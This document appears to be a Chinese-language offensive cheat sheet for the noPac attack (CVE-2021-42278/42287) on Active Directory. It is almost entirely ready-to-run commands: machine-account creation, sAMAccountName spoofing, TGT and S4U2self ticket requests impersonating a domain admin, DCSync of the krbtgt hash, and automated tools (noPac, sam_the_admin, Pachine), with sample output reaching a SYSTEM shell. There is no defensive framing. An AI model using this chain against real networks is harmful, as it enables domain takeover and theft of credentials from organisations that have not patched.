	需要MachineAccountQuota > 0
  #### 检查账户的MachineAccountQuota
  	>crackmapexec ldap 10.10.10.10 -u username -p 'Password123' -d 'domain.local' --kdcHost 10.10.10.10 -M MAQ
	>StandIn.exe --object ms-DS-MachineAccountQuota=*
  #### 检查DC是否存在漏洞
  	>crackmapexec smb 10.10.10.10 -u '' -p '' -d domain -M nopac
  #### EXPLOIT
  ##### 添加计算机账户
  	impacket@linux> addcomputer.py -computer-name 'ControlledComputer$' -computer-pass 'ComputerPassword' -dc-host DC01 -domain-netbios domain 'domain.local/user1:complexpassword'
	
	powermad@windows> . .\Powermad.ps1
	powermad@windows> $password = ConvertTo-SecureString 'ComputerPassword' -AsPlainText -Force
	powermad@windows> New-MachineAccount -MachineAccount "ControlledComputer" -Password $($password) -Domain "domain.local" -DomainController "DomainController.domain.local" -Verbose
	
	sharpmad@windows> Sharpmad.exe MAQ -Action new -MachineAccount ControlledComputer -MachinePassword ComputerPassword
  ##### 清除被控机器账户的servicePrincipalName 属性
  	impacket@linux> addspn.py -u 'domain\user' -p 'password' -t 'ControlledComputer$' -c DomainController

	powershell@windows> . .\Powerview.ps1
	powershell@windows> Set-DomainObject "CN=ControlledComputer,CN=Computers,DC=domain,DC=local" -Clear 'serviceprincipalname' -Verbose
  ##### (CVE-2021-42278) 将受控机器帐户 sAMAccountName 更改为域控制器的名称，不带尾随 $
  	impacket@linux> renameMachine.py -current-name 'ControlledComputer$' -new-name 'DomainController' -dc-ip 'DomainController.domain.local' 'domain.local'/'user':'password'

	powermad@windows> Set-MachineAccountAttribute -MachineAccount "ControlledComputer" -Value "DomainController" -Attribute samaccountname -Verbose
  ##### 为被控机器申请TGT
  	impacket@linux> getTGT.py -dc-ip 'DomainController.domain.local' 'domain.local'/'DomainController':'ComputerPassword'

	cmd@windows> Rubeus.exe asktgt /user:"DomainController" /password:"ComputerPassword" /domain:"domain.local" /dc:"DomainController.domain.local" /nowrap
  ##### 充值被控账户的sAMAccountName 到旧值
  	impacket@linux> renameMachine.py -current-name 'DomainController' -new-name 'ControlledComputer$' 'domain.local'/'user':'password'

	powermad@windows> Set-MachineAccountAttribute -MachineAccount "ControlledComputer" -Value "ControlledComputer" -Attribute samaccountname -Verbose
  ##### (CVE-2021-42287) 通过出示之前获得的 TGT 向 S4U2self 请求服务票证
  	impacket@linux> KRB5CCNAME='DomainController.ccache' getST.py -self -impersonate 'DomainAdmin' -spn 'cifs/DomainController.domain.local' -k -no-pass -dc-ip 'DomainController.domain.local' 'domain.local'/'DomainController'

	cmd@windows> Rubeus.exe s4u /self /impersonateuser:"DomainAdmin" /altservice:"ldap/DomainController.domain.local" /dc:"DomainController.domain.local" /ptt /ticket:[Base64 TGT]
  ##### DCSync
	DCSync: KRB5CCNAME='DomainAdmin.ccache' secretsdump.py -just-dc-user 'krbtgt' -k -no-pass -dc-ip 'DomainController.domain.local' @'DomainController.domain.local'
  #### 自动exploit
  	https://github.com/cube0x0/noPac
	>noPac.exe scan -domain htb.local -user user -pass 'password123'
	>noPac.exe -domain htb.local -user domain_user -pass 'Password123!' /dc dc.htb.local /mAccount demo123 /mPassword Password123! /service cifs /ptt
	>noPac.exe -domain htb.local -user domain_user -pass "Password123!" /dc dc.htb.local /mAccount demo123 /mPassword Password123! /service ldaps /ptt /impersonate Administrator
	https://github.com/WazeHell/sam-the-admin
	>python3 sam_the_admin.py "caltech/alice.cassie:Lee@tPass" -dc-ip 192.168.1.110 -shell
	[*] Selected Target dc.caltech.white                                              
	[*] Total Domain Admins 11                                                        
	[*] will try to impersonat gaylene.dreddy                                         
	[*] Current ms-DS-MachineAccountQuota = 10                                        
	[*] Adding Computer Account "SAMTHEADMIN-11$"                                     
	[*] MachineAccount "SAMTHEADMIN-11$" password = EhFMT%mzmACL                      
	[*] Successfully added machine account SAMTHEADMIN-11$ with password EhFMT%mzmACL.
	[*] SAMTHEADMIN-11$ object = CN=SAMTHEADMIN-11,CN=Computers,DC=caltech,DC=white   
	[*] SAMTHEADMIN-11$ sAMAccountName == dc                                          
	[*] Saving ticket in dc.ccache                                                    
	[*] Resting the machine account to SAMTHEADMIN-11$                                
	[*] Restored SAMTHEADMIN-11$ sAMAccountName to original value                     
	[*] Using TGT from cache                                                          
	[*] Impersonating gaylene.dreddy                                                  
	[*]     Requesting S4U2self                                                       
	[*] Saving ticket in gaylene.dreddy.ccache                                        
	[!] Launching semi-interactive shell - Careful what you execute                   
	C:\Windows\system32>whoami                                                        
	nt authority\system 
	https://github.com/ly4k/Pachine
	>python3 pachine.py -dc-host dc.predator.local -scan 'predator.local/john:Passw0rd!'
	>python3 pachine.py -dc-host dc.predator.local -spn cifs/dc.predator.local -impersonate administrator 'predator.local/john:Passw0rd!'
	>export KRB5CCNAME=$PWD/administrator@predator.local.ccache
	>impacket-psexec -k -no-pass 'predator.local/administrator@dc.predator.local'